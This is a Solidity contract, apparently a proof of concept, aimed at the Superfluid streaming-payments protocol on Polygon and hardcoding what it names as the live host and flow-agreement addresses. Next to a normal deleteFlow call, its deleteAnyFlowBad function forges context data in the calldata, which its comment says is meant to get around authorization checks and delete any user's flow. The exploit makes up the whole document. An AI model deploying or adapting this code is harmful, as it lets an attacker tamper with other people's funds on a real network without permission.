pragma solidity >= 0.7.6;

import { ISuperfluid, ISuperAgreement } from "./interfaces/superfluid/ISuperfluid.sol";
import { IConstantFlowAgreementV1 } from "./interfaces/agreements/IConstantFlowAgreementV1.sol";

contract BadCallAgreementPolygon {

    address constant HOST = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address constant CFA = 0x6EeE6060f715257b970700bc2656De21dEdF074C;

    // deletes a given flow the expected way - fails if msg.sender not authorized to do so
    function deleteAnyFlowGood(address token, address sender, address receiver) public {
        ISuperfluid host = ISuperfluid(HOST);
        host.callAgreement(
            ISuperAgreement(CFA),
            abi.encodeWithSelector(
                IConstantFlowAgreementV1.deleteFlow.selector,
                token,
                sender,
                receiver,
                new bytes(0)
            ),
            new bytes(0)
        );
    }

    // deletes a given flow with fake context data appended to the calldata trying to get around authorization checks
    function deleteAnyFlowBad(address token, address sender, address receiver) public {
        ISuperfluid host = ISuperfluid(HOST);
        host.callAgreement(
            ISuperAgreement(CFA),
            abi.encodeWithSelector(
                IConstantFlowAgreementV1.deleteFlow.selector,
                token,
                sender,
                receiver,
                abi.encode(
                    abi.encode(
                        4294967296, // (CALL_INFO_CALL_TYPE_AGREEMENT << 32) | 0,
                        block.timestamp,
                        sender,
                        IConstantFlowAgreementV1.deleteFlow.selector,
                        new bytes(0)
                    ),
                    abi.encode(
                        0,
                        0,
                        address(0),
                        address(0)
                    )
                ), // fake ctx
                new bytes(0) // placeHolderCtx
            ),
            new bytes(0)
        );
    }
}
